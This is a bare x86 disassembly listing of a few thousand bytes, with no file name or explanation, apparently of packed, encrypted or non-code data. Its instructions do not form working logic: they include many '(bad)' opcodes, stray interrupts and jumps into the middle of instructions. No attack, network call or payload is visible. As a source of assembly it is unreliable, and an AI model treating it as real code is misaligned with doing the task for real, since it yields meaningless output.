  427182:	int    0x96
  427184:	cmc    
  427185:	int    0x22
  427187:	cmp    ecx,DWORD PTR [edi]
  427189:	shr    ebx,cl
  42718b:	xchg   edx,eax
  42718c:	cmp    ebx,ecx
  42718e:	shr    edx,cl
  427190:	sub    BYTE PTR [ebx+0x13],dl
  427193:	retf   0x4d8c
  427196:	rol    BYTE PTR [edx-0x2d],1
  427199:	int    0x8d
  42719b:	adc    al,0xcd
  42719d:	mov    ebp,ecx
  42719f:	xchg   esi,eax
  4271a0:	adc    al,0xcd
  4271a2:	and    bh,BYTE PTR [ebx]
  4271a4:	psrlq  mm5,mm3
  4271a7:	xchg   edx,eax
  4271a8:	cmp    ebx,ecx
  4271aa:	shr    edx,cl
  4271ac:	sub    BYTE PTR [ebx+0x13],dl
  4271af:	retf   0x4d8c
  4271b2:	ror    BYTE PTR [edx-0x2d],1
  4271b5:	int    0x8d
  4271b7:	cmc    
  4271b8:	int    0x89
  4271ba:	int    0x96
  4271bc:	cmc    
  4271bd:	int    0x22
  4271bf:	cmp    ecx,DWORD PTR [edi]
  4271c1:	cmp    ebx,ecx
  4271c3:	shr    ebx,cl
  4271c5:	xchg   edx,eax
  4271c6:	shr    edx,cl
  4271c8:	sub    BYTE PTR [ebx+0x13],dl
  4271cb:	retf   0x4d8c
  4271ce:	push   ebp
  4271cf:	pusha  
  4271d0:	jge    0x427201
  4271d2:	push   es
  4271d3:	mov    esp,0xcd808081
  4271d8:	jbe    0x4271ee
  4271da:	int    0x8d
  4271dc:	adc    al,0xcd
  4271de:	mov    ebp,ecx
  4271e0:	cmp    BYTE PTR [ebx],0xf0
  4271e3:	shl    edx,cl
  4271e5:	sub    BYTE PTR [ebx],bh
  4271e7:	jns    0x4271bc
  4271e9:	mov    ebp,0xcad35392
  4271ee:	je     0x427175
  4271f0:	ror    ch,1
  4271f2:	lea    edx,[ecx]
  4271f4:	int    0x89
  4271f6:	int    0x96
  4271f8:	adc    ebp,ecx
  4271fa:	and    bh,BYTE PTR [ebx]
  4271fc:	psrlq  mm5,mm3
  4271ff:	xchg   edx,eax
  427200:	cmp    ebx,ecx
  427202:	shr    edx,cl
  427204:	sub    BYTE PTR [ebx+0x13],dl
  427207:	retf   0x4d8c
  42720a:	rol    BYTE PTR [edx-0x2d],1
  42720d:	int    0x8d
  42720f:	in     eax,dx
  427210:	int    0x89
  427212:	int    0x96
  427214:	in     eax,dx
  427215:	int    0x22
  427217:	cmp    ecx,DWORD PTR [edi]
  427219:	shr    ebx,cl
  42721b:	xchg   edx,eax
  42721c:	cmp    ebx,ecx
  42721e:	shr    edx,cl
  427220:	sub    BYTE PTR [ebx+0x13],dl
  427223:	retf   0x4d8c
  427226:	ror    BYTE PTR [edx-0x2d],1
  427229:	int    0x8d
  42722b:	adc    ebp,ecx
  42722d:	mov    ebp,ecx
  42722f:	xchg   esi,eax
  427230:	adc    ebp,ecx
  427232:	and    bh,BYTE PTR [ebx]
  427234:	(bad)  
  427236:	(bad)  
  427238:	jmp    0x4271cc
  42723a:	shr    edx,cl
  42723c:	sub    BYTE PTR [ebx+0x13],dl
  42723f:	retf   0x4d8c
  427242:	push   ebp
  427243:	pusha  
  427244:	jge    0x427275
  427246:	push   es
  427247:	cmc    
  427248:	add    BYTE PTR [eax-0x12893280],0xcd
  42724f:	(bad)  
  427250:	in     eax,dx
  427251:	int    0x89
  427253:	int    0x80
  427255:	cmp    esi,eax
  427257:	shl    edx,cl
  427259:	sub    BYTE PTR [ebx],bh
  42725b:	jns    0x427230
  42725d:	mov    ebp,0xcad35392
  427262:	je     0x4271e9
  427264:	ror    ch,1
  427266:	lea    edx,[ecx*8+0x1496cd89]
  42726d:	int    0x22
  42726f:	cmp    ecx,DWORD PTR [edi]
  427271:	shr    ebx,cl
  427273:	xchg   edx,eax
  427274:	cmp    ebx,ecx
  427276:	shr    edx,cl
  427278:	sub    BYTE PTR [ebx+0x13],dl
  42727b:	retf   0x4d8c
  42727e:	rol    BYTE PTR [edx-0x2d],1
  427281:	int    0x8d
  427283:	cmc    
  427284:	int    0x89
  427286:	int    0x96
  427288:	cmc    
  427289:	int    0x22
  42728b:	cmp    ecx,DWORD PTR [edi]
  42728d:	shr    ebx,cl
  42728f:	xchg   edx,eax
  427290:	cmp    ebx,ecx
  427292:	shr    edx,cl
  427294:	sub    BYTE PTR [ebx+0x13],dl
  427297:	retf   0x4d8c
  42729a:	ror    BYTE PTR [edx-0x2d],1
  42729d:	int    0x8d
  42729f:	adc    al,0xcd
  4272a1:	mov    ebp,ecx
  4272a3:	xchg   esi,eax
  4272a4:	adc    al,0xcd
  4272a6:	and    bh,BYTE PTR [ebx]
  4272a8:	(bad)  
  4272aa:	(bad)  
  4272ac:	jmp    0x427240
  4272ae:	shr    edx,cl
  4272b0:	sub    BYTE PTR [ebx+0x13],dl
  4272b3:	retf   0x4d8c
  4272b6:	push   ebp
  4272b7:	pusha  
  4272b8:	jge    0x4272e9
  4272ba:	push   es
  4272bb:	add    DWORD PTR [eax+0x76cd8080],eax
  4272c1:	in     eax,dx
  4272c2:	int    0x8d
  4272c4:	in     eax,dx
  4272c5:	int    0x89
  4272c7:	int    0x80
  4272c9:	cmp    esi,eax
  4272cb:	shl    edx,cl
  4272cd:	sub    BYTE PTR [ebx],bh
  4272cf:	jns    0x4272a4
  4272d1:	mov    ebp,0xcad35392
  4272d6:	je     0x42725d
  4272d8:	ror    ch,1
  4272da:	(bad)  
  4272db:	cmc    
  4272dc:	int    0x89
  4272de:	int    0x96
  4272e0:	cmc    
  4272e1:	int    0x22
  4272e3:	cmp    ecx,DWORD PTR [edi]
  4272e5:	shr    ebx,cl
  4272e7:	xchg   edx,eax
  4272e8:	cmp    ebx,ecx
  4272ea:	shr    edx,cl
  4272ec:	sub    BYTE PTR [ebx+0x13],dl
  4272ef:	retf   0x4d8c
  4272f2:	rol    BYTE PTR [edx-0x2d],1
  4272f5:	int    0x8d
  4272f7:	adc    ebp,ecx
  4272f9:	mov    ebp,ecx
  4272fb:	xchg   esi,eax
  4272fc:	adc    ebp,ecx
  4272fe:	and    bh,BYTE PTR [ebx]
  427300:	psrlq  mm5,mm3
  427303:	xchg   edx,eax
  427304:	cmp    ebx,ecx
  427306:	shr    edx,cl
  427308:	sub    BYTE PTR [ebx+0x13],dl
  42730b:	retf   0x4d8c
  42730e:	ror    BYTE PTR [edx-0x2d],1
  427311:	int    0x8d
  427313:	in     eax,dx
  427314:	int    0x89
  427316:	int    0x96
  427318:	in     eax,dx
  427319:	int    0x22
  42731b:	cmp    ecx,DWORD PTR [edi]
  42731d:	cmp    ebx,ecx
  42731f:	shr    ebx,cl
  427321:	xchg   edx,eax
  427322:	shr    edx,cl
  427324:	sub    BYTE PTR [ebx+0x13],dl
  427327:	retf   0x4d8c
  42732a:	push   ebp
  42732b:	pusha  
  42732c:	jge    0x427304
  42732e:	xor    bh,cl
  427330:	jbe    0x427302
  427332:	jo     0x4272f1
  427334:	outs   dx,DWORD PTR ds:[esi]
  427335:	lods   eax,DWORD PTR ds:[esi]
  427336:	add    BYTE PTR [eax],al
  427338:	int    0x8d
  42733a:	pop    ebp
  42733b:	inc    ebx
  42733c:	rcl    esp,cl
  42733e:	push   ss
  42733f:	int    0x76
  427341:	std    
  427342:	int    0x8d
  427344:	std    
  427345:	cmp    esi,eax
  427347:	cmp    edi,DWORD PTR [ecx-0x2d]
  42734a:	repnz sub bl,dl
  42734d:	mov    ebp,0xad35392
  427352:	jbe    0x427301
  427354:	int    0x76
  427356:	stc    
  427357:	int    0xa6
  427359:	stc    
  42735a:	int    0x76
  42735c:	stc    
  42735d:	int    0x8d
  42735f:	stc    
  427360:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  427366:	xchg   edx,eax
  427367:	shr    DWORD PTR [ebp-0x7862acd8],cl
  42736d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42736e:	gs int 0x76
  427371:	xchg   ebp,eax
  427372:	cmp    ecx,DWORD PTR [edi]
  427374:	add    al,0xf2
  427376:	std    
  427377:	add    al,0xad
  427379:	std    
  42737a:	shr    esp,cl
  42737c:	sub    BYTE PTR [edi+0x12db537d],al
  427382:	hlt    
  427383:	dec    ecx
  427384:	and    DWORD PTR [esi-0x28932cb],eax
  42738a:	int    0x8d
  42738c:	std    
  42738d:	cmp    esi,eax
  42738f:	cmp    edi,DWORD PTR [ecx-0x2d]
  427392:	repnz sub bl,dl
  427395:	mov    ebp,0xcdd35392
  42739a:	lea    ebp,[ebp+0x52f7d43]
  4273a0:	push   ds
  4273a1:	std    
  4273a2:	add    BYTE PTR [eax],al
  4273a4:	int    0x76
  4273a6:	std    
  4273a7:	int    0x8d
  4273a9:	std    
  4273aa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ad:	lock shl edx,cl
  4273b0:	sub    bl,dl
  4273b2:	mov    ebp,0xcdd35392
  4273b7:	lea    ebp,[ebp+0x1ad67d43]
  4273bd:	int    0x76
  4273bf:	stc    
  4273c0:	int    0x8d
  4273c2:	stc    
  4273c3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273c6:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4273cd:	push   ebx
  4273ce:	shr    ebx,cl
  4273d0:	jle    0x427353
  4273d2:	add    BYTE PTR [eax+0x5b6324c0],0x0
  4273d9:	(bad)  
  4273da:	popf   
  4273db:	iret   
  4273dc:	jbe    0x4273f3
  4273de:	jo     0x42739d
  4273e0:	jge    0x4273bd
  4273e2:	add    BYTE PTR [eax],al
  4273e4:	int    0x76
  4273e6:	std    
  4273e7:	int    0x8d
  4273e9:	std    
  4273ea:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ed:	lock shl edx,cl
  4273f0:	sub    bl,dl
  4273f2:	mov    ebp,0xcdd35392
  4273f7:	lea    esp,[ebp+0x5bd4d343]
  4273fd:	int    0x76
  4273ff:	stc    
  427400:	int    0x8d
  427402:	stc    
  427403:	cmp    edi,DWORD PTR [ecx+0x3b]
  427406:	lock shl edx,cl
  427409:	sub    bl,dl
  42740b:	mov    ebp,0xcdd35392
  427410:	lea    esp,[ebp+0x26d4d343]
  427416:	int    0x76
  427418:	stc    
  427419:	int    0x8d
  42741b:	stc    
  42741c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42741f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427426:	push   ebx
  427427:	shl    DWORD PTR [eax+0x5b],cl
  42742a:	iret   
  42742b:	jbe    0x427442
  42742d:	jo     0x4273ec
  42742f:	das    
  427430:	cli    
  427431:	add    BYTE PTR [eax],al
  427433:	int    0x76
  427435:	std    
  427436:	int    0x8d
  427438:	std    
  427439:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427443:	push   ebx
  427444:	shl    DWORD PTR [eax+0x5b],cl
  427447:	iret   
  427448:	jbe    0x42745f
  42744a:	jo     0x427409
  42744c:	sti    
  42744d:	stc    
  42744e:	add    BYTE PTR [eax],al
  427450:	int    0x76
  427452:	popf   
  427453:	xchg   ebp,eax
  427455:	or     dh,BYTE PTR [esi+0x14]
  427458:	add    dh,dl
  42745a:	cmp    eax,0xcd14d600
  42745f:	jbe    0x427496
  427461:	xchg   DWORD PTR [esi-0x78],esi
  427464:	jo     0x427423
  427466:	push   edx
  427467:	fild   DWORD PTR [eax]
  427469:	add    ch,cl
  42746b:	jbe    0x42746a
  42746d:	int    0x8d
  42746f:	std    
  427470:	cmp    edi,DWORD PTR [ecx+0x3b]
  427473:	lock shl edx,cl
  427476:	sub    bl,dl
  427478:	mov    ebp,0xcdd35392
  42747d:	lea    esp,[ebp-0x592b2cbd]
  427483:	int    0x76
  427485:	stc    
  427486:	int    0x8d
  427488:	stc    
  427489:	cmp    edi,DWORD PTR [ecx+0x3b]
  42748c:	lock shl edx,cl
  42748f:	sub    bl,dl
  427491:	mov    ebp,0xcdd35392
  427496:	lea    esp,[ebp+0x32d4d343]
  42749c:	int    0x76
  42749e:	stc    
  42749f:	int    0x8d
  4274a1:	stc    
  4274a2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274a5:	mov    ebp,0xd3f03b92
  4274aa:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274ae:	jo     0x4274b0
  4274b0:	(bad)  
  4274b1:	cmp    eax,0x873576cd
  4274b6:	jbe    0x427440
  4274b8:	jo     0x427477
  4274ba:	add    eax,0xcd0000f9
  4274bf:	jbe    0x4274be
  4274c1:	int    0x8d
  4274c3:	std    
  4274c4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274c7:	mov    ebp,0xd3f03b92
  4274cc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274d0:	jo     0x4274d2
  4274d2:	(bad)  
  4274d3:	cmp    eax,0x873576cd
  4274d8:	jbe    0x427462
  4274da:	jo     0x427499
  4274dc:	jb     0x4274d7
  4274de:	add    BYTE PTR [eax],al
  4274e0:	int    0x8d
  4274e2:	inc    ebp
  4274e3:	int    0x76
  4274e5:	inc    ebp
  4274e6:	cmp    ecx,ecx
  4274e8:	cmp    ecx,DWORD PTR [edi]
  4274ea:	shr    ebx,cl
  4274ec:	xchg   edx,eax
  4274ed:	shr    DWORD PTR [ebp-0x322cacd8],cl
  4274f3:	lea    ebp,ds:0x803fd33b
  4274f9:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427503:	jo     0x427505
  427505:	(bad)  
  427506:	cmp    eax,0x87358dcd
  42750b:	lea    ecx,[eax+0xa95abd]
  427511:	add    ch,cl
  427513:	jbe    0x427545
  427515:	int    0x8d
  427517:	cmp    eax,0x76cd8881
  42751c:	cmp    eax,0xabd7687
  427521:	jbe    0x4274e0
  427523:	int    0x76
  427525:	stc    
  427526:	int    0x8d
  427528:	stc    
  427529:	cmp    esi,eax
  42752b:	shl    edx,cl
  42752d:	sub    BYTE PTR [ebx],bh
  42752f:	jns    0x427504
  427531:	mov    ebp,0xcdd35392
  427536:	lea    edi,[ebp-0x322c2ed1]
  42753c:	(bad)  
  42753d:	std    
  42753e:	int    0x96
  427540:	std    
  427541:	cmp    ecx,DWORD PTR [edi]
  427543:	cmp    ebx,ecx
  427545:	shr    ebx,cl
  427547:	xchg   edx,eax
  427548:	shr    edx,cl
  42754a:	sub    BYTE PTR [ebx+0x13],dl
  42754d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427553:	or     edi,DWORD PTR [ecx]
  427555:	cli    
  427556:	add    BYTE PTR [eax],al
  427558:	int    0x76
  42755a:	mov    BYTE PTR [edx-0x2d349c58],ch
  427560:	xor    BYTE PTR [eax+0x4edcd96],al
  427566:	in     eax,dx
  427567:	adc    al,0x5b
  427569:	cwde   
  42756a:	call   0xcd34:0x76cd6d3b
  427571:	add    DWORD PTR ds:0xcd808081,ebp
  427577:	xchg   esi,eax
  427578:	mov    ch,cl
  42757a:	or     ch,0xd6
  42757d:	dec    esp
  42757e:	int    0xe6
  427580:	mov    ch,cl
  427582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427583:	dec    esp
  427584:	or     dh,BYTE PTR [esi-0x3]
  427587:	pop    edi
  427588:	jnp    0x4275c1
  42758a:	ficom  WORD PTR [ebx]
  42758c:	cmp    esp,ebx
  42758e:	pop    ebp
  42758f:	mov    ebp,0x3b25230a
  427594:	adc    DWORD PTR [edi],ebp
  427596:	inc    ebp
  427597:	sti    
  427598:	xchg   edx,eax
  427599:	shr    ecx,cl
  42759b:	sub    BYTE PTR [edx],dl
  42759d:	clc    
  42759e:	add    BYTE PTR [eax-0x102c9380],0x92
  4275a5:	cmp    ebx,ebp
  4275a7:	push   ebx
  4275a8:	clc    
  4275a9:	int    0xe6
  4275ab:	sbb    al,0x53
  4275ad:	aad    0x43
  4275af:	(bad)  
  4275b1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275b4:	(bad)  
  4275b5:	das    
  4275b6:	adc    cl,BYTE PTR [ebp+0x59]
  4275b9:	je     0x427565
  4275bb:	push   edi
  4275bc:	ja     0x427583
  4275be:	xchg   edi,eax
  4275bf:	shr    ebx,0xd9
  4275c2:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  4275cc:	xchg   esi,eax
  4275cd:	mov    ch,cl
  4275cf:	(bad)  
  4275d0:	dec    esp
  4275d1:	int    0x96
  4275d3:	mov    ch,cl
  4275d5:	(bad)  
  4275d6:	dec    esp
  4275d7:	int    0xe6
  4275d9:	mov    ch,cl
  4275db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275dc:	dec    esp
  4275dd:	cmp    edx,DWORD PTR [ecx]
  4275df:	cmp    esp,ebx
  4275e1:	das    
  4275e2:	inc    ebp
  4275e3:	sti    
  4275e4:	xchg   edx,eax
  4275e5:	shr    ecx,cl
  4275e7:	sub    BYTE PTR [edx],dl
  4275e9:	clc    
  4275ea:	add    BYTE PTR [eax-0x22c49380],0x53
  4275f1:	aad    0xd3
  4275f3:	out    dx,eax
  4275f4:	xchg   edx,eax
  4275f5:	push   ebx
  4275f6:	clc    
  4275f7:	int    0xe6
  4275f9:	xor    ch,cl
  4275fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275fc:	adc    al,0x3b
  4275fe:	popf   
  4275ff:	int    0x76
  427601:	xor    BYTE PTR [ebx],bh
  427603:	cli    
  427604:	int    0x8d
  427606:	adc    al,0x2f
  427608:	inc    ebp
  427609:	loope  0x42759d
  42760b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427611:	cli    
  427612:	push   esi
  427613:	add    BYTE PTR [eax-0x132c9380],0x92
  42761a:	push   ebx
  42761b:	popf   
  42761c:	int    0x76
  42761e:	mov    BYTE PTR [edi-0x320be427],al
  427624:	bswap  ebp
  427626:	(bad)  
  427627:	dec    esp
  427628:	int    0xe6
  42762a:	xor    ch,cl
  42762c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42762d:	adc    al,0x4
  42762f:	lods   eax,DWORD PTR ds:[esi]
  427630:	std    
  427631:	add    al,0xe9
  427633:	std    
  427634:	shr    ebx,cl
  427636:	sub    BYTE PTR [ebx],bh
  427638:	ficom  DWORD PTR [esi-0x2c]
  42763b:	aaa    
  42763c:	ficom  WORD PTR [ebx]
  42763e:	adc    dh,bh
  427640:	mov    ebp,0x1225230a
  427645:	clc    
  427646:	aam    0x37
  427648:	ficom  WORD PTR [ebx]
  42764a:	adc    dh,ah
  42764c:	mov    ebp,0x8725230a
  427651:	leave  
  427652:	sbb    esi,esp
  427654:	push   ebx
  427655:	jge    0x4276aa
  427657:	cdq    
  427658:	pop    ebp
  427659:	mov    ebp,0x1225230a
  42765e:	add    dl,dh
  427660:	aaa    
  427661:	ficom  WORD PTR [ebx]
  427663:	cmp    esi,ecx
  427665:	adc    bh,dl
  427667:	out    0x37,al
  427669:	ficom  WORD PTR [ebx]
  42766b:	(bad)  
  42766c:	sbb    eax,DWORD PTR [ebx-0xf]
  42766f:	(bad)  
  427670:	das    
  427671:	adc    dl,BYTE PTR [esi-0x1]
  427674:	das    
  427675:	stos   DWORD PTR es:[edi],eax
  427676:	push   es
  427677:	in     eax,0x9b
  427679:	xchg   edi,eax
  42767a:	imul   bl
  42767c:	and    al,0x81
  42767e:	add    BYTE PTR [eax-0x32776933],0xd6
  427685:	dec    esp
  427686:	int    0xa6
  427688:	mov    ch,cl
  42768a:	out    0x4c,al
  42768c:	cmp    edx,DWORD PTR [ecx]
  42768e:	pop    edi
  42768f:	jnp    0x4276c8
  427691:	ficom  WORD PTR [ebx]
  427693:	cmp    esp,ebx
  427695:	das    
  427696:	inc    ebp
  427697:	sti    
  427698:	xchg   edx,eax
  427699:	shr    edi,cl
  42769b:	xchg   edx,eax
  42769c:	cmp    eax,DWORD PTR [eax]
  42769e:	shl    ebp,cl
  4276a0:	sub    BYTE PTR [edx],cl
  4276a2:	(bad)  
  4276a3:	cmc    
  4276a4:	push   ebx
  4276a5:	fxch   st(5)
  4276a7:	out    0xf5,al
  4276a9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276b4:	and    al,0xcd
  4276b6:	and    ecx,DWORD PTR [edx]
  4276b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276b9:	adc    DWORD PTR [ebx-0x1e],eax
  4276bc:	(bad)  
  4276bd:	xchg   BYTE PTR [ebx],bh
  4276bf:	fiadd  DWORD PTR [ebx-0x27]
  4276c2:	aam    0x20
  4276c4:	add    dh,dl
  4276c6:	xor    al,0xcd
  4276c8:	(bad)  
  4276c9:	and    al,0x0
  4276cb:	(bad)  
  4276cc:	sub    al,0x0
  4276ce:	(bad)  
  4276cf:	std    
  4276d0:	add    BYTE PTR [eax-0x43],bl
  4276d3:	sub    edi,eax
  4276d5:	add    BYTE PTR [eax],al
  4276d7:	or     al,BYTE PTR [esi-0x7f7f9615]
  4276dd:	or     ch,0x96
  4276e0:	mov    ch,cl
  4276e2:	out    0x4c,al
  4276e4:	cmp    edi,ecx
  4276e6:	cmp    esp,ebx
  4276e8:	das    
  4276e9:	inc    ebp
  4276ea:	add    edx,DWORD PTR [edx+0xa9210d3]
  4276f0:	out    0xf5,al
  4276f2:	int    0xe6
  4276f4:	mov    ch,cl
  4276f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f7:	dec    esp
  4276f8:	shr    ecx,cl
  4276fa:	sub    BYTE PTR [ebx],bh
  4276fc:	dec    ebp
  4276fe:	(bad)  
  4276ff:	cmc    
  427700:	cmp    ebx,ebp
  427702:	push   ebx
  427703:	clc    
  427704:	int    0xe6
  427706:	xor    BYTE PTR [ebx],bh
  427708:	cli    
  427709:	push   ebx
  42770a:	aad    0xcd
  42770c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42770d:	adc    al,0x3b
  42770f:	popf   
  427710:	int    0xc9
  427712:	int    0xe6
  427714:	xor    ch,cl
  427716:	or     al,0xcd
  427718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427719:	adc    al,0x2f
  42771b:	inc    ebp
  42771c:	jge    0x4276b0
  42771e:	shr    ecx,cl
  427720:	sub    BYTE PTR [ebx],bh
  427722:	fst    st(3)
  427724:	jmp    0x4276b8
  427726:	adc    bh,al
  427728:	add    BYTE PTR [eax-0x3aac9380],0x53
  42772f:	lock inc ebx
  427731:	icebp  
  427732:	(bad)  
  427733:	sbb    BYTE PTR [ebx+0x2],al
  427736:	(bad)  
  427737:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42773d:	mov    esi,0xdd8bf56d
  427742:	(bad)  
  427743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427744:	cmp    edi,esp
  427746:	sbb    eax,0xcd62ec76
  42774b:	jbe    0x4276d5
  42774d:	int    0x8d
  42774f:	dec    esp
  427750:	int    0x96
  427752:	mov    ch,cl
  427754:	(bad)  
  427755:	dec    esp
  427756:	adc    al,BYTE PTR [edx]
  427758:	mov    ebp,0x5625230a
  42775d:	jnp    0x427796
  42775f:	ficom  WORD PTR [ebx]
  427761:	das    
  427762:	inc    ebp
  427763:	jge    0x4276f7
  427765:	int    0xfb
  427767:	cmp    eax,DWORD PTR [eax]
  427769:	cmp    ebx,edx
  42776b:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  427771:	jmp    0x427705
  427773:	adc    dh,bh
  427775:	add    BYTE PTR [eax-0x36ac9380],0x53
  42777c:	divps  xmm6,XMMWORD PTR [esi-0x3]
  427780:	(bad)  
  427781:	test   BYTE PTR [ebx-0x1d],al
  427784:	aam    0x4c
  427786:	adc    al,BYTE PTR [esi-0x3e]
  427789:	gs sub al,0x1
  42778c:	jo     0x4277c8
  42778e:	mov    edx,0x124aece0
  427793:	ss inc edx
  427795:	das    
  427796:	sbb    edx,esi
  427798:	mov    ebx,0xaa029f75
  42779d:	test   al,0x63
  42779f:	retf   
  4277a0:	shr    BYTE PTR [eax+eax*4],cl
  4277a3:	xchg   esi,eax
  4277a4:	int    0xed
  4277a6:	add    al,0xed
  4277a8:	dec    esp
  4277a9:	int    0x76
  4277ab:	mov    ch,cl
  4277ad:	lea    ecx,[edi+ebp*1+0x45]
  4277b1:	jge    0x427745
  4277b3:	shr    ebx,cl
  4277b5:	xchg   edx,eax
  4277b6:	int    0x8d
  4277b8:	mov    ch,cl
  4277ba:	xchg   esi,eax
  4277bb:	dec    esp
  4277bc:	cwde   
  4277bd:	shl    edx,cl
  4277bf:	sub    ch,cl
  4277c1:	lea    ebx,[ecx+ebp*2]
  4277c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277c5:	mov    esi,0x793b4229
  4277ca:	cmp    ebx,edx
  4277cc:	push   ebx
  4277cd:	ror    BYTE PTR [edx],cl
  4277cf:	or     ebp,0x1cd2476
  4277d5:	xor    eax,0xcd808081
  4277da:	mov    ch,cl
  4277dc:	jbe    0x427802
  4277de:	int    0x1
  4277e0:	xor    eax,0xcd808081
  4277e5:	add    BYTE PTR [edi-0x72329b92],0x24
  4277ec:	int    0xa
  4277ee:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  4277f4:	adc    al,0xc0
  4277f6:	test   BYTE PTR [eax+eax*4+0x808050],bh
  4277fd:	nop
  4277fe:	jo     0x427862
  427800:	add    bl,ah
  427802:	or     cl,BYTE PTR [ebx-0x32778933]
  427808:	lea    ecx,[edi+ebp*1+0x45]
  42780c:	jge    0x4277a0
  42780e:	shr    ebx,cl
  427810:	xchg   edx,eax
  427811:	int    0x8d
  427813:	mov    ch,cl
  427815:	xchg   esi,eax
  427816:	dec    esp
  427817:	add    dh,dl
  427819:	and    al,0x3b
  42781b:	jns    0x427858
  42781d:	ficom  DWORD PTR [ebx-0x2e]
  427820:	or     dh,BYTE PTR [esi-0x3]
  427823:	iret   
  427824:	jbe    0x427823
  427826:	jo     0x4277c2
  427828:	add    dh,dl
  42782a:	sbb    al,0xd3
  42782c:	repnz sub BYTE PTR [eax],al
  42782f:	(bad)  
  427830:	adc    al,0x0
  427832:	(bad)  
  427833:	xor    BYTE PTR [eax],al
  427835:	(bad)  
  427836:	dec    esp
  427837:	add    dh,dl
  427839:	mov    BYTE PTR [ebp+0xfe2b],bh
  42783f:	int    0x76
  427841:	mov    ch,cl
  427843:	lea    ecx,[edi+ebp*1+0x45]
  427847:	jge    0x4277db
  427849:	shr    ebx,cl
  42784b:	xchg   edx,eax
  42784c:	int    0x8d
  42784e:	mov    ch,cl
  427850:	xchg   esi,eax
  427851:	dec    esp
  427852:	cmp    edi,DWORD PTR [ecx+0x3b]
  427855:	fcmovbe st,st(3)
  427857:	repnz sub ch,cl
  42785a:	das    
  42785b:	push   ebx
  42785c:	rol    BYTE PTR [ebx+0x7d],cl
  42785f:	aam    0x36
  427861:	int    0x76
  427863:	xor    ch,cl
  427865:	lea    edx,[edi+ebp*1]
  427868:	inc    ebp
  427869:	jge    0x4277fd
  42786b:	shr    ebx,cl
  42786d:	xchg   edx,eax
  42786e:	int    0x8d
  427870:	xor    ch,cl
  427872:	xchg   esi,eax
  427873:	adc    al,0x3b
  427875:	jns    0x4278b2
  427877:	fcmovbe st,st(3)
  427879:	repnz sub ch,cl
  42787c:	lea    ebx,[ebx+edx*2]
  42787f:	shr    BYTE PTR [edi],cl
  427881:	shl    DWORD PTR [esi-0x3],1
  427884:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  42788a:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  427891:	call   0xcd3c:0xd6cd6d3b
  427898:	xchg   esi,eax
  427899:	inc    esp
  42789a:	int    0xe6
  42789c:	and    al,0x5d
  42789e:	mov    ebp,0x5f25230a
  4278a3:	jnp    0x4278dc
  4278a5:	ficom  WORD PTR [ebx]
  4278a7:	inc    ebx
  4278a8:	icebp  
  4278a9:	das    
  4278aa:	or     BYTE PTR [edi],al
  4278ac:	add    BYTE PTR [eax-0x4613080],0x82
  4278b3:	test   BYTE PTR [ebx-0xc],al
  4278b6:	jnp    0x42789e
  4278b8:	inc    ebx
  4278b9:	hlt    
  4278ba:	(bad)  
  4278bb:	mov    BYTE PTR [ebx-0xf],al
  4278be:	das    
  4278bf:	add    eax,0x80809216
  4278c4:	adc    bh,bh
  4278c6:	jno    0x4278ff
  4278c8:	ficom  WORD PTR [ebx]
  4278ca:	(bad)  
  4278cb:	mov    BYTE PTR [ebx-0xf],al
  4278ce:	das    
  4278cf:	add    eax,0x80809285
  4278d4:	adc    bh,bh
  4278d6:	xchg   esi,eax
  4278d7:	aaa    
  4278d8:	ficom  WORD PTR [ebx]
  4278da:	(bad)  
  4278db:	mov    BYTE PTR [ebx-0xf],al
  4278de:	das    
  4278df:	add    eax,0x808080f8
  4278e4:	adc    bh,bh
  4278e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278e7:	aaa    
  4278e8:	ficom  WORD PTR [ebx]
  4278ea:	(bad)  
  4278eb:	test   BYTE PTR [ebx-0xf],al
  4278ee:	aam    0x3e
  4278f0:	adc    bh,bh
  4278f2:	scas   al,BYTE PTR es:[edi]
  4278f3:	aaa    
  4278f4:	ficom  WORD PTR [ebx]
  4278f6:	(bad)  
  4278f7:	mov    BYTE PTR [ebx-0xf],al
  4278fa:	das    
  4278fb:	add    eax,0x808081db
  427900:	adc    bh,bh
  427902:	mov    dh,0x37
  427904:	ficom  WORD PTR [ebx]
  427906:	das    
  427907:	push   es
  427908:	into   
  427909:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427913:	sub    bl,0x12
  427916:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427920:	(bad)  
